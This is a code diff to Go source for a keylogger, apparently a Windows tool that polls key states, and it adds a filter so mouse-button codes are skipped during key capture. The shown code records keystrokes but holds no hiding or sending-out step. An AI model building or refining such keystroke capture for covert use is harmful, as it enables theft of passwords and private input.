@@ -41,6 +41,26 @@ type Key struct {
 	Keycode int
 }
 
+// MouseButtonKeycodes list
+var mouseButtonKeycodes = []int{
+	1,   // Left mouse button
+	2,   // Right mouse button
+	4,   // Middle mouse button (scroll wheel click)
+	5,   // X1 mouse button (side button)
+	6,   // X2 mouse button (side button)
+	255, // Any additional mouse buttons or special mouse events
+}
+
+// isMouseButton checks if the keycode corresponds to a mouse button
+func isMouseButton(keycode int) bool {
+	for _, code := range mouseButtonKeycodes {
+		if keycode == code {
+			return true
+		}
+	}
+	return false
+}
+
 // GetKey gets the current entered key by the user, if there is any
 func (kl *Keylogger) GetKey() Key {
 	activeKey := 0
@@ -51,7 +71,7 @@ func (kl *Keylogger) GetKey() Key {
 
 		// Check if the most significant bit is set (key is down)
 		// And check if the key is not a non-char key (except for space, 0x20)
-		if keyState&(1<<15) != 0 && (i < 160 || i > 165) && (i < 91 || i > 93) {
+		if keyState&(1<<15) != 0 && !isMouseButton(i) && (i < 160 || i > 165) && (i < 91 || i > 93) {
 			activeKey = i
 			break
 		}
@@ -69,7 +89,7 @@ func (kl *Keylogger) GetKey() Key {
 	return Key{Empty: true}
 }
 
-// ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
+// ParseKeycode returns the correct Key struct for a key taking into account the current keyboard settings
 // That struct contains the Rune for the key
 func (kl Keylogger) ParseKeycode(keyCode int, keyState uint16) Key {
 	key := Key{Empty: false, Keycode: keyCode}
